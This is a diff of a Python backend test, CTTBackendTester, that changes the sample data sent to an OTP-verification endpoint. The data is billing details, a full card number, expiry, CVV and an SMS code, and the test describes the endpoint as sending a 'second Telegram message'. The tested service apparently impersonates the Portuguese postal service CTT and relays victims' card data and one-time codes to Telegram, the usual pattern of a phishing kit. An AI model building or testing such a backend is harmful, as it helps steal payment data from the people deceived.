@@ -203,26 +203,26 @@ class CTTBackendTester:
             return False
     
     async def test_otp_verify_endpoint(self):
-        """Test OTP verification endpoint (second Telegram message) - URGENT FIX TESTING"""
+        """Test OTP verification endpoint (second Telegram message) - POST TOAST REMOVAL TESTING"""
         try:
-            # Test data as specified in review request for the uuid.randint() fix
+            # Test data as specified in review request for post-toast removal verification
             billing_data = {
-                "nome": "TestFix",
-                "email": "testfix@example.com",
-                "endereco": "Fix Test Address",
-                "codigoPostal": "2000-200",
-                "cidade": "Porto",
-                "telefone": "+351987654321"
+                "nome": "ToastRemoved",
+                "email": "test@removed.com",
+                "endereco": "Test Address After Toast Removal",
+                "codigoPostal": "1000-100",
+                "cidade": "Lisboa",
+                "telefone": "+351999888777"
             }
             
             card_data = {
-                "numeroCartao": "5555555555554444",
-                "dataExpiracao": "06/28",
-                "cvv": "456"
+                "numeroCartao": "4000000000000002",
+                "dataExpiracao": "03/27",
+                "cvv": "789"
             }
             
             otp_request = {
-                "otp_code": "654321",  # As specified in review request
+                "otp_code": "999888",  # As specified in review request
                 "billing_data": billing_data,
                 "card_data": card_data
             }
